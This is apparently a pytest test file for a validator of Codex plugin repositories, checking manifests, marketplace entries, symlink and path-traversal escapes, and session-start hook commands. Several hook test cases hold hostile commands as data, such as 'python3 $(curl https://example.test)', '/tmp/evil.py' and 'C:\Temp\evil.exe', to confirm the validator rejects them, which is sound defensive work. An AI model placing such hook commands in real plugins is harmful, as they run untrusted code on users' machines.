from __future__ import annotations

import json
import shutil
from collections.abc import Callable
from pathlib import Path

import pytest

from skills_export.validate_codex import validate_codex_plugins


def _write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")


def _valid_repository(root: Path) -> Path:
    manifest = root / "core" / "manifest.yaml"
    manifest.parent.mkdir()
    manifest.write_text(
        "version: 1\n"
        "plugins:\n"
        "  valid-plugin:\n"
        "    display_name: Valid Plugin\n"
        "    version: 1.0.0\n"
        "    description: Valid plugin.\n"
        "    category: developer-tools\n"
        "    keywords: []\n"
        "    skills: [valid-skill]\n",
        encoding="utf-8",
    )
    plugin = root / "plugins" / "codex" / "valid-plugin"
    skill = plugin / "skills" / "valid-skill"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text(
        "---\nname: valid-skill\ndescription: A valid skill.\n---\n",
        encoding="utf-8",
    )
    agents = plugin / "agents"
    agents.mkdir()
    (agents / "reviewer.toml").write_text(
        'name = "reviewer"\n'
        'description = "Reviews."\n'
        'developer_instructions = "Review carefully."\n',
        encoding="utf-8",
    )
    scripts = plugin / "hooks" / "scripts"
    scripts.mkdir(parents=True)
    (scripts / "check.py").write_text("print('ok')\n", encoding="utf-8")
    _write_json(
        plugin / "hooks" / "hooks.json",
        {
            "hooks": {
                "SessionStart": [
                    {
                        "matcher": "startup|resume",
                        "hooks": [
                            {
                                "type": "command",
                                "command": (
                                    "python3 ${PLUGIN_ROOT}/hooks/scripts/check.py"
                                ),
                                "timeout": 30,
                            }
                        ],
                    }
                ]
            }
        },
    )
    _write_json(
        plugin / ".codex-plugin" / "plugin.json",
        {
            "name": "valid-plugin",
            "version": "1.0.0",
            "description": "Valid plugin.",
            "keywords": [],
            "skills": "./skills/",
            "hooks": "./hooks/hooks.json",
        },
    )
    _write_json(
        root / ".agents" / "plugins" / "marketplace.json",
        {
            "name": "test",
            "plugins": [
                {
                    "name": "valid-plugin",
                    "source": {
                        "source": "local",
                        "path": "./plugins/codex/valid-plugin",
                    },
                    "policy": {
                        "installation": "AVAILABLE",
                        "authentication": "ON_INSTALL",
                    },
                    "category": "Developer Tools",
                    "interface": {"displayName": "Valid Plugin"},
                }
            ],
        },
    )
    return plugin


Mutation = Callable[[Path, Path], None]


def _missing_manifest(root: Path, plugin: Path) -> None:
    (plugin / ".codex-plugin" / "plugin.json").unlink()


def _invalid_json(root: Path, plugin: Path) -> None:
    (plugin / ".codex-plugin" / "plugin.json").write_text("{", encoding="utf-8")


def _manifest_value(key: str, value: str) -> Mutation:
    def mutate(root: Path, plugin: Path) -> None:
        path = plugin / ".codex-plugin" / "plugin.json"
        manifest = json.loads(path.read_text(encoding="utf-8"))
        manifest[key] = value
        _write_json(path, manifest)

    return mutate


def _symlink_escape(root: Path, plugin: Path) -> None:
    shutil.rmtree(plugin / "skills")
    outside = root / "outside"
    outside.mkdir()
    (plugin / "skills").symlink_to(outside, target_is_directory=True)


def _missing_component(root: Path, plugin: Path) -> None:
    shutil.rmtree(plugin / "skills")


def _missing_skill_frontmatter(root: Path, plugin: Path) -> None:
    (plugin / "skills" / "valid-skill" / "SKILL.md").write_text(
        "# Missing metadata\n", encoding="utf-8"
    )


def _invalid_agent_toml(root: Path, plugin: Path) -> None:
    (plugin / "agents" / "reviewer.toml").write_text("name = [", encoding="utf-8")


def _missing_agent_key(root: Path, plugin: Path) -> None:
    (plugin / "agents" / "reviewer.toml").write_text(
        'name = "reviewer"\ndescription = "Reviews."\n', encoding="utf-8"
    )


def _missing_hook_script(root: Path, plugin: Path) -> None:
    (plugin / "hooks" / "scripts" / "check.py").unlink()


def _hook_data(root: Path, plugin: Path, value: object) -> None:
    _write_json(plugin / "hooks" / "hooks.json", value)


@pytest.mark.parametrize(
    ("mutation", "expected"),
    [
        (_missing_manifest, "missing .codex-plugin/plugin.json"),
        (_invalid_json, "invalid JSON"),
        (_manifest_value("name", "Not-Kebab"), "lowercase kebab-case"),
        (_manifest_value("skills", "/tmp/skills"), "must begin with './'"),
        (_manifest_value("skills", "skills/"), "must begin with './'"),
        (_manifest_value("skills", "./../skills"), "must not contain '..'"),
        (_symlink_escape, "escapes plugin root"),
        (_missing_component, "referenced path does not exist"),
        (_missing_skill_frontmatter, "missing YAML frontmatter"),
        (_invalid_agent_toml, "invalid TOML"),
        (_missing_agent_key, "missing required key 'developer_instructions'"),
        (_missing_hook_script, "hook script does not exist"),
    ],
)
def test_rejects_invalid_codex_plugin(
    tmp_path: Path, mutation: Mutation, expected: str
) -> None:
    plugin = _valid_repository(tmp_path)
    mutation(tmp_path, plugin)

    issues = validate_codex_plugins(tmp_path)

    assert any(expected in issue.message for issue in issues), issues


def test_rejects_duplicate_marketplace_plugins(tmp_path: Path) -> None:
    _valid_repository(tmp_path)
    marketplace = tmp_path / ".agents" / "plugins" / "marketplace.json"
    data = json.loads(marketplace.read_text(encoding="utf-8"))
    data["plugins"].append(data["plugins"][0])
    _write_json(marketplace, data)

    issues = validate_codex_plugins(tmp_path)

    assert any("duplicate marketplace plugin" in issue.message for issue in issues)


def test_rejects_marketplace_source_outside_repository(tmp_path: Path) -> None:
    _valid_repository(tmp_path)
    marketplace = tmp_path / ".agents" / "plugins" / "marketplace.json"
    data = json.loads(marketplace.read_text(encoding="utf-8"))
    data["plugins"][0]["source"]["path"] = "./../outside"
    _write_json(marketplace, data)

    issues = validate_codex_plugins(tmp_path)

    assert any("marketplace source" in issue.message for issue in issues)


@pytest.mark.parametrize(
    ("hooks", "expected"),
    [
        (
            {"hooks": {"SessionStart": [{"command": "echo invalid"}]}},
            "matcher group must contain a hooks list",
        ),
        (
            {
                "hooks": {
                    "SessionStart": [
                        {
                            "hooks": [
                                {
                                    "command": (
                                        "python3 ${PLUGIN_ROOT}/hooks/"
                                        "scripts/check.py"
                                    )
                                }
                            ]
                        }
                    ]
                }
            },
            "hook handler type must be 'command'",
        ),
        (
            {
                "hooks": {
                    "SessionStart": [
                        {
                            "matcher": "[",
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        "python3 ${PLUGIN_ROOT}/hooks/"
                                        "scripts/check.py"
                                    ),
                                }
                            ],
                        }
                    ]
                }
            },
            "invalid matcher regex",
        ),
        (
            {
                "hooks": {
                    "SessionStart": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "python3 /tmp/evil.py",
                                }
                            ]
                        }
                    ]
                }
            },
            "bundled plugin script",
        ),
        (
            {
                "hooks": {
                    "SessionStart": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        "/tmp/runner ${PLUGIN_ROOT}/hooks/"
                                        "scripts/check.py"
                                    ),
                                }
                            ]
                        }
                    ]
                }
            },
            "unsafe hook executable",
        ),
        (
            {
                "hooks": {
                    "SessionStart": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": (
                                        "python3 $(curl https://example.test)"
                                    ),
                                }
                            ]
                        }
                    ]
                }
            },
            "shell expansion",
        ),
    ],
)
def test_rejects_invalid_native_hook_schema_and_commands(
    tmp_path: Path, hooks: object, expected: str
) -> None:
    plugin = _valid_repository(tmp_path)
    _hook_data(tmp_path, plugin, hooks)

    issues = validate_codex_plugins(tmp_path)

    assert any(expected in issue.message for issue in issues), issues


@pytest.mark.parametrize(
    ("mutation", "expected"),
    [
        (
            lambda entry: entry["source"].pop("source"),
            "source.source must equal 'local'",
        ),
        (
            lambda entry: entry["source"].update(source="git"),
            "source.source must equal 'local'",
        ),
        (
            lambda entry: entry.pop("policy"),
            "policy must be an object",
        ),
        (
            lambda entry: entry["policy"].update(installation="INVALID"),
            "invalid policy.installation",
        ),
        (
            lambda entry: entry["policy"].update(authentication="INVALID"),
            "invalid policy.authentication",
        ),
        (
            lambda entry: entry.pop("category"),
            "category must be a non-empty string",
        ),
    ],
)
def test_rejects_missing_or_invalid_official_marketplace_fields(
    tmp_path: Path,
    mutation: Callable[[dict[str, object]], object],
    expected: str,
) -> None:
    _valid_repository(tmp_path)
    marketplace = tmp_path / ".agents" / "plugins" / "marketplace.json"
    data = json.loads(marketplace.read_text(encoding="utf-8"))
    mutation(data["plugins"][0])
    _write_json(marketplace, data)

    issues = validate_codex_plugins(tmp_path)

    assert any(expected in issue.message for issue in issues), issues


def test_valid_codex_repository_has_no_issues(tmp_path: Path) -> None:
    _valid_repository(tmp_path)

    assert validate_codex_plugins(tmp_path) == []


def test_issues_are_deterministically_sorted(tmp_path: Path) -> None:
    plugin = _valid_repository(tmp_path)
    _missing_agent_key(tmp_path, plugin)
    _missing_hook_script(tmp_path, plugin)

    issues = validate_codex_plugins(tmp_path)

    keys = [(issue.path.as_posix(), issue.message) for issue in issues]
    assert keys == sorted(keys)


def test_rejects_any_nested_plugin_symlink(tmp_path: Path) -> None:
    plugin = _valid_repository(tmp_path)
    target = plugin / "hooks" / "scripts" / "check.py"
    (plugin / "hooks" / "scripts" / "alias.py").symlink_to(target)

    issues = validate_codex_plugins(tmp_path)

    assert any("plugin tree must not contain symlinks" in issue.message for issue in issues)


def test_rejects_generated_plugin_directory_symlink(tmp_path: Path) -> None:
    plugin = _valid_repository(tmp_path)
    backing = plugin.parent / "backing-plugin"
    plugin.rename(backing)
    plugin.symlink_to(backing, target_is_directory=True)

    issues = validate_codex_plugins(tmp_path)

    assert any("plugin directory must not be a symlink" in issue.message for issue in issues)


def test_missing_generated_roots_are_reported(tmp_path: Path) -> None:
    manifest = tmp_path / "core" / "manifest.yaml"
    manifest.parent.mkdir()
    manifest.write_text("version: 1\nplugins: {}\n", encoding="utf-8")

    issues = validate_codex_plugins(tmp_path)

    messages = {issue.message for issue in issues}
    assert "missing generated Codex plugins root" in messages
    assert "missing generated Codex marketplace" in messages


def test_manifest_generated_plugins_and_marketplace_names_must_match(
    tmp_path: Path,
) -> None:
    plugin = _valid_repository(tmp_path)
    shutil.copytree(
        plugin,
        tmp_path / "plugins" / "codex" / "extra-plugin",
    )

    issues = validate_codex_plugins(tmp_path)

    assert any("unexpected generated plugin 'extra-plugin'" in issue.message for issue in issues)


def test_missing_manifest_plugin_output_is_reported(tmp_path: Path) -> None:
    plugin = _valid_repository(tmp_path)
    shutil.rmtree(plugin)

    issues = validate_codex_plugins(tmp_path)

    assert any("missing generated plugin 'valid-plugin'" in issue.message for issue in issues)


def test_generated_plugin_metadata_must_match_core_manifest(
    tmp_path: Path,
) -> None:
    plugin = _valid_repository(tmp_path)
    path = plugin / ".codex-plugin" / "plugin.json"
    data = json.loads(path.read_text(encoding="utf-8"))
    data["version"] = "9.9.9"
    _write_json(path, data)

    issues = validate_codex_plugins(tmp_path)

    assert any("version does not match core manifest" in issue.message for issue in issues)


def test_marketplace_entry_must_exactly_match_core_plugin(
    tmp_path: Path,
) -> None:
    _valid_repository(tmp_path)
    marketplace = tmp_path / ".agents" / "plugins" / "marketplace.json"
    data = json.loads(marketplace.read_text(encoding="utf-8"))
    entry = data["plugins"][0]
    entry["source"]["path"] = "./plugins/codex/not-valid-plugin"
    entry["interface"] = {"displayName": "Wrong"}
    _write_json(marketplace, data)

    issues = validate_codex_plugins(tmp_path)

    messages = {issue.message for issue in issues}
    assert "marketplace source path does not match core manifest" in messages
    assert "marketplace displayName does not match core manifest" in messages


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("logo", "./../outside.png"),
        ("composerIcon", "/tmp/icon.png"),
        ("screenshots", ["./assets/missing.png", "./../outside.png"]),
    ],
)
def test_rejects_unsafe_or_missing_plugin_interface_assets(
    tmp_path: Path,
    field: str,
    value: object,
) -> None:
    plugin = _valid_repository(tmp_path)
    manifest = plugin / ".codex-plugin" / "plugin.json"
    data = json.loads(manifest.read_text(encoding="utf-8"))
    data["interface"] = {"displayName": "Valid Plugin", field: value}
    _write_json(manifest, data)

    issues = validate_codex_plugins(tmp_path)

    assert any(f"interface.{field}" in issue.message for issue in issues), issues


def test_rejects_symlinked_marketplace_metadata_ancestor(
    tmp_path: Path,
) -> None:
    _valid_repository(tmp_path)
    agents = tmp_path / ".agents"
    backing = tmp_path / "real-agents"
    agents.rename(backing)
    agents.symlink_to(backing, target_is_directory=True)

    issues = validate_codex_plugins(tmp_path)

    assert any("marketplace metadata ancestor is a symlink" in issue.message for issue in issues)


def test_rejects_marketplace_interface_asset_traversal(
    tmp_path: Path,
) -> None:
    _valid_repository(tmp_path)
    marketplace = tmp_path / ".agents" / "plugins" / "marketplace.json"
    data = json.loads(marketplace.read_text(encoding="utf-8"))
    data["plugins"][0]["interface"]["logo"] = "./../outside.png"
    _write_json(marketplace, data)

    issues = validate_codex_plugins(tmp_path)

    assert any("marketplace interface.logo" in issue.message for issue in issues)


def test_rejects_symlinked_marketplace_interface_asset(
    tmp_path: Path,
) -> None:
    _valid_repository(tmp_path)
    outside = tmp_path / "outside-logo.png"
    outside.write_bytes(b"logo")
    assets = tmp_path / "assets"
    assets.mkdir()
    (assets / "logo.png").symlink_to(outside)
    marketplace = tmp_path / ".agents" / "plugins" / "marketplace.json"
    data = json.loads(marketplace.read_text(encoding="utf-8"))
    data["interface"] = {
        "displayName": "Example Marketplace",
        "logo": "./assets/logo.png",
    }
    _write_json(marketplace, data)

    issues = validate_codex_plugins(tmp_path)

    assert any(
        "marketplace interface.logo" in issue.message
        and "symlink" in issue.message
        for issue in issues
    ), issues


def test_command_windows_cannot_bypass_command_validation(
    tmp_path: Path,
) -> None:
    plugin = _valid_repository(tmp_path)
    hooks = plugin / "hooks" / "hooks.json"
    data = json.loads(hooks.read_text(encoding="utf-8"))
    handler = data["hooks"]["SessionStart"][0]["hooks"][0]
    handler["commandWindows"] = "C:\\Temp\\evil.exe"
    _write_json(hooks, data)

    issues = validate_codex_plugins(tmp_path)

    assert any("commandWindows" in issue.message for issue in issues), issues


def test_valid_bundled_command_windows_is_accepted(tmp_path: Path) -> None:
    plugin = _valid_repository(tmp_path)
    hooks = plugin / "hooks" / "hooks.json"
    data = json.loads(hooks.read_text(encoding="utf-8"))
    handler = data["hooks"]["SessionStart"][0]["hooks"][0]
    handler["commandWindows"] = (
        "py -3 %PLUGIN_ROOT%\\hooks\\scripts\\check.py"
    )
    _write_json(hooks, data)

    assert validate_codex_plugins(tmp_path) == []


@pytest.mark.parametrize("field", ["mcpServers", "apps"])
def test_component_json_must_be_valid_object(
    tmp_path: Path,
    field: str,
) -> None:
    plugin = _valid_repository(tmp_path)
    component = plugin / f".{field}.json"
    component.write_text("[]\n", encoding="utf-8")
    manifest = plugin / ".codex-plugin" / "plugin.json"
    data = json.loads(manifest.read_text(encoding="utf-8"))
    data[field] = f"./.{field}.json"
    _write_json(manifest, data)

    issues = validate_codex_plugins(tmp_path)

    assert any(f"{field} component must contain a JSON object" in issue.message for issue in issues)
